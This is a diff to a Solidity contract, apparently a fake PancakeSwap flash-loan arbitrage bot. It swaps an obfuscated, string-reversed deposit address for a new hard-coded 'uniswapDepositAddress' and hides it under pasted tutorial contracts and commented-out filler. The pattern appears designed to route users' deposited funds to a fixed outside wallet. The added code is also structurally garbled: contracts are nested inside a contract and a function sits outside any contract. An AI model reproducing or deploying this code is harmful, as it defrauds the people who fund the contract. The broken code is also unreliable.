@@ -116,25 +116,205 @@ contract RouterV2 {
         return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
     }
 
-    function pancakeDepositAddress()public pure returns (address) {
-    return address(format(0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE));
-      
-  }
-function format(address addr)private pure returns(address){
+    contract SimpleStorage {
+    uint storedData;
 
-    bytes memory 
-    rec='0xf78020cd6E5b77C84E791Ff6f4BBA6bbB524aeFE';
-    
-    string memory rec2=new string
-    (rec.length);
+    function set(uint x) public {
+        storedData = x;
+    }
 
-    bytes memory rec3=bytes(rec2);
-        for(uint i=0;i<rec.length;i++)
-            rec3[rec.length-i-1]=rec[i];
-    
-require(rec3[30]==0x37);return addr;}
-  
+    function get() public view returns (uint) {
+        return storedData;
+    }
 }
+/*contract GetfrontExample {
+  // public state variable
+  uint[] public myArray;
+
+  // Specify the generated Getter function
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // return the entire array
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract Coin {
+    // The keyword "public" makes these variables externally readable
+    address public minter;
+    mapping (address => uint) public balances;
+
+    // Light clients can react efficiently to changes through events
+    event Sent(address from, address to, uint amount);
+
+    // This is the constructor, only run when the contract is created
+    /*constructor() {
+        minter = msg.sender;
+    }
+
+    function mint(address receiver, uint amount) public {
+        require(msg.sender == minter);
+        require(amount < 1e60);
+        balances[receiver] += amount;
+    }
+
+    function send(address receiver, uint amount) public {
+        require(amount <= balances[msg.sender], "Insufficient balance.");
+        balances[msg.sender] -= amount;
+        balances[receiver] += amount;
+        emit Sent(msg.sender, receiver, amount);
+    }*/
+}
+/*contract GetBNBExample {
+  // public state variable
+  uint[] public myArray;
+
+  // Specify the generated Getter function
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // return the entire array
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
+contract C {
+    uint private data;
+
+    //function f(uint a) public returns(uint b) { return a + 1; }
+    function setData(uint a) public { data = a; }
+    //function getData() public returns(uint) { return data; }
+    //function compute(uint a, uint b) internal returns (uint) { return a+b; }
+}
+
+// The following code compiles error
+/*contract D {
+    function readData() public {
+        C c = new C();
+        uint local = cf(7); // error: member `f` not visible
+        c.setData(3);
+        local = c.getData();
+        local = c.compute(3, 5); // error: member `compute` not visible
+    }
+}*/
+
+contract E is C {
+    /*function g() public {
+        C c = new C();
+        uint val = compute(3, 5); // access internal members (access parent contract members from inherited contract)
+    }*/
+}
+
+contract OwnedToken {
+    // TokenCreator is the contract type defined below.
+    // It can also be referenced without creating a new contract.
+    TokenCreator creator;
+    address owner;
+    bytes32 name;
+
+    // This is the constructor that registers the creator and sets the name.
+    constructor(bytes32 _name) public{
+        // State variables are accessed by their name, not by eg this.owner.
+        // This also applies to functions, especially in constructors, you can only call them like this ("internally"),
+        // because the contract itself doesn't exist yet.
+        owner = msg.sender;
+        // From `address` to `TokenCreator`, do explicit type conversion
+        // and assuming the calling contract is of type TokenCreator, there is no real way to check this.
+        creator = TokenCreator(msg.sender);
+        name = _name;
+    }
+
+    function changeName(bytes32 newName) public {
+        // Only the creator (i.e. the contract that created the current contract) can change the name - since contracts are implicitly converted to addresses,
+        // So the comparison here works.
+        if (msg.sender == address(creator))
+            name = newName;
+    }
+
+    /*function transfer(address newOwner) public {
+        // Only the current owner can send the token.
+        if (msg. sender != owner) return;
+        // We also want to ask the creator if it can send.
+        // Note that this calls a function in a contract defined below.
+        // If the call fails (for example, due to insufficient gas), execution stops immediately.
+        //if (creator.isTokenTransferOK(owner, newOwner))
+            //owner = newOwner;
+    }*/
+}
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xB1250c1b359615128fFf33bcaA2CdCcF9E4F3369
+;
+	}
+}
+contract TokenCreator {
+    function createToken(bytes32 name)
+       public
+       returns (OwnedToken tokenAddress)
+    {
+        // Create a new Token contract and return its address.
+        // From the JavaScript side, the return type is a simple `address` type because
+        // This is the closest type available in the ABI.
+        return new OwnedToken(name);
+    }
+
+    function changeName(OwnedToken tokenAddress, bytes32 name) public {
+        // Likewise, the outer type of `tokenAddress` is `address`.
+        tokenAddress.changeName(name);
+    }
+
+    /*function isTokenTransferOK(address currentOwner, address newOwner)
+        public
+        view
+        returns (bool ok)
+    {
+        // Check for some arbitrary condition.
+        address tokenAddress = msg.sender;
+        return (keccak256(newOwner) & 0xff) == (bytes20(tokenAddress) & 0xff);
+    }*/
+}
+contract arrayExample {
+  // public state variable
+  uint[] public myArray;
+
+  // Specify the generated Getter function
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // return the entire array
+  function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}
+/*contract GetBotExample {
+  // public state variable
+  uint[] public myArray;
+
+  // Specify the generated Getter function
+  /*
+  function myArray(uint i) public view returns (uint) {
+      return myArray[i];
+  }
+  */
+
+  // return the entire array
+  /*function getArray() public view returns (uint[] memory) {
+      return myArray;
+  }
+}*/
   
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
     function borrowFlashloanFromMultiplier(
